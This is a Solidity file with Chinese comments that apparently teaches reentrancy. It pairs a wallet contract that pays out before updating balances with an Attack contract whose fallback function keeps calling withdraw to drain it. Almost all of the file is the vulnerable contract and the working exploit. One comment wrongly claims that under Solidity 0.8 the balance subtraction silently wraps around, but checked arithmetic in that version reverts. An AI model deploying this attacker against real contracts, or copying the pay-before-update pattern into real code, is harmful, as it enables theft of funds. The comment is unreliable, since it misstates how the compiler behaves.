//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/**
 * @dev 类似钱包的功能，模拟重入攻击
 */
contract EtherStore {
    mapping(address => uint256) balances;

    // 存款
    function despoit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) external {
        // 判断调用者的余额是否大于_amount
        require(balances[msg.sender] >= _amount, "no balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "send error");
        // 这里多次执行，并不会导致uint类型报错，只是会变成uint256.max - _amount
        // 不会变成负数，只会反着来
        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function getMapping(address _addr) public view returns(uint256) {
        return balances[_addr];
    }
}

/**
 * @dev 重入攻击合约
 */
contract Attack {
    EtherStore es;

    constructor(address _addr) payable public {
        es = EtherStore(_addr);
    }

    fallback() external payable {
        if(address(es).balance >= 1 ether) {
            es.withdraw(1 ether);
        }
    }

    // 攻击方法
    function attack() external payable {
        require(msg.value >= 1 ether);
        es.despoit{value: 1 ether}();
        es.withdraw(1 ether);
        
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}
